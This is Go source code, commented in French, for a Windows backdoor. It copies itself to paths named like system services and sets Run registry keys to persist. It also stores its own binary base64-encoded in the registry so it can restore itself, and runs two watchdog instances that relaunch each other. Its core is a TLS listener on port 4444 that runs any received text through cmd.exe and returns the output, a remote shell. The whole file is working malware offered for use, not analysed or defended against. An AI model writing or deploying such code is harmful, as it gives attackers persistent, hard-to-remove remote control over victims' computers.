package main

import (
	"crypto/tls"
	"encoding/base64"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	intervalSec = 10
)

var (
	copyLocations = []string{
		`C:\ProgramData\SystemService.exe`,
		`C:\Users\Public\services.exe`,
	}
)

// Copie l'exécutable dans plusieurs emplacements
func copySelf(dest string) error {
	src, err := os.Executable()
	if err != nil {
		return err
	}
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()
	destFile, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer destFile.Close()
	_, err = io.Copy(destFile, srcFile)
	return err
}

// Configure une clé de registre pour le démarrage
func setRunKey(name, path string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue(name, path)
}

// Stocke l'exécutable dans le registre
func storeInRegistry() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		return err
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Backdoor`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("Payload", encoded)
}

// Restaure l'exécutable depuis le registre
func restoreFromRegistry(dest string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Backdoor`, registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	encoded, _, err := key.GetStringValue("Payload")
	if err != nil {
		return err
	}
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return err
	}
	return os.WriteFile(dest, data, 0644)
}

// Configure la persistance
func setupPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Erreur récupération chemin exécutable:", err)
		return
	}
	setRunKey("SystemServiceA", exePath+" A")
	setRunKey("SystemServiceB", exePath+" B")
	for _, dest := range copyLocations {
		if err := copySelf(dest); err != nil {
			log.Println("Erreur copie fichier:", err)
		}
	}
	storeInRegistry()
}

// Vérifie si un processus est actif
func isRunning(pid int) bool {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return false
	}
	defer windows.CloseHandle(handle)
	var exitCode uint32
	err = windows.GetExitCodeProcess(handle, &exitCode)
	if err != nil {
		return false
	}
	return exitCode == windows.STILL_ACTIVE
}

// Gère les connexions réseau
func handleConnection(conn net.Conn) {
	defer conn.Close()
	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			log.Println("Erreur lecture connexion:", err)
			return
		}
		cmd := string(buf[:n])
		out, err := exec.Command("cmd", "/C", cmd).Output()
		if err != nil {
			conn.Write([]byte("Erreur: " + err.Error() + "\n"))
		} else {
			conn.Write(out)
		}
	}
}

// Exécute la backdoor TLS
func runBackdoor() {
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Fatalf("Erreur chargement certificats TLS: %v", err)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	listener, err := tls.Listen("tcp", ":4444", config)
	if err != nil {
		log.Fatalf("Erreur écoute TLS: %v", err)
	}
	defer listener.Close()
	log.Println("Backdoor démarrée sur :4444")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Erreur acceptation connexion:", err)
			continue
		}
		log.Println("Client connecté:", conn.RemoteAddr())
		go handleConnection(conn)
	}
}

// Surveille l'autre instance
func monitor(otherID string) {
	for {
		time.Sleep(intervalSec * time.Second)
		pidFile := filepath.Join(os.TempDir(), "backdoor_"+otherID+".pid")
		data, err := os.ReadFile(pidFile)
		if err != nil {
			log.Println("Fichier PID manquant, tentative relance", otherID)
			startOther(otherID)
			continue
		}
		pid, err := strconv.Atoi(string(data))
		if err != nil || !isRunning(pid) {
			log.Println("Processus", otherID, "inactif, relance...")
			startOther(otherID)
		}
	}
}

// Lance l'autre instance
func startOther(id string) {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Erreur chemin exécutable:", err)
		return
	}
	for _, dest := range copyLocations {
		if _, err := os.Stat(dest); os.IsNotExist(err) {
			if err := restoreFromRegistry(dest); err != nil {
				log.Println("Restauration depuis registre échouée:", err)
				continue
			}
		}
		cmd := exec.Command(dest, id)
		err = cmd.Start()
		if err != nil {
			log.Println("Erreur démarrage", id, ":", err)
			continue
		}
		log.Println("Instance", id, "démarrée")
		return
	}
	log.Println("Aucune copie valide trouvée pour relancer", id)
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("ID requis (A ou B)")
	}
	id := os.Args[1]
	if id != "A" && id != "B" {
		log.Fatal("ID invalide (doit être A ou B)")
	}
	pidFile := filepath.Join(os.TempDir(), "backdoor_"+id+".pid")
	pid := os.Getpid()
	err := os.WriteFile(pidFile, []byte(strconv.Itoa(pid)), 0644)
	if err != nil {
		log.Println("Erreur écriture fichier PID:", err)
	}
	setupPersistence()

	otherID := "B"
	if id == "B" {
		otherID = "A"
	}

	go runBackdoor()
	go monitor(otherID)

	log.Println("Backdoor", id, "active. En attente...")
	select {}
}
